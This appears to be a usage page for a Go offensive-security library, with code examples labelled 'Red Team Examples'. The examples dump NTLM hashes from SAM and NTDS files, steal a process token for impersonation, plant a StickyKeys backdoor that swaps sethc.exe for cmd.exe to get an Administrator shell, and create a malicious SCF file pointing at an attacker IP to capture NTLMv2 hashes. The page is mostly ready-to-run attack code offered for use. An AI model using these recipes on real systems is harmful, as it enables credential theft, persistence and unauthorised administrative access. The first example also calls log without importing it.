# Red Team Examples

## Dump system hashes (different ways)

- This functions use [gosecretsdump](https://github.com/C-Sto/gosecretsdump) which is really fast and can NTLM dump hashes with a lot of config options

```go
package main

import (
  "fmt"

  "github.com/D3Ext/maldev/redteam"
)

func main(){
  // First way (using SAM and SYSTEM)
  hashes1, err := redteam.DumpSamHashes("C:\\path\\to\\system", "C:\\path\\to\\sam")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes1)

  // Second way (using NTDS and SYSTEM)
  hashes2, err := redteam.DumpNtdsHashes("C:\\path\\to\\system", "C:\\path\\to\\ntds")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes2)

  // Third way (automated mode)
  hashes3, err := redteam.AutoHashDump()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes3)

}
```

## Steal process token (impersonation)

```go
package main

import (
  "log"

  "github.com/D3Ext/maldev/redteam"
)

func main(){

  pid := 1234 // Set PID to steal
  token, err := redteam.Impersonate(pid) // Returns error if user doesn't have privileges
  if err != nil {
    log.Fatal(err)
  }
}
```

## StickyKeys backdoor

- This function replaces the ***sethc.exe*** binary with a ***cmd.exe*** so when you press **SHIFT** 3 times it launches a terminal as Administrator. It also creates a backup of the sethc.exe binary so you also can use the **RevertStickyKeys()**

```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/maldev/redteam"
)

func main(){
  err := redteam.StickyKeys()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Backdoor added successfully!")

  err = redteam.RevertStickyKeys()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Backdoor reverted!")
}
```

## Create malicious SCF

- With this function you can create a malicious SCF file to obtain ***NTLMv2*** hashes once a user opens the SMB share

```go
package main

import (
  "log"

  "github.com/D3Ext/maldev/redteam"
)

func main(){
  path := "C:\\Path\\To\\Smb\\Share\\malicious.scf" // Path with filename where SCF file will be stored
  ip := "192.168.1.37" // Attacker ip, if a responder is running you will receive NTLMv2 hashes

  err := redteam.CreateScf(path, ip)
  if err != nil {
    log.Fatal(err)
  }
}
```




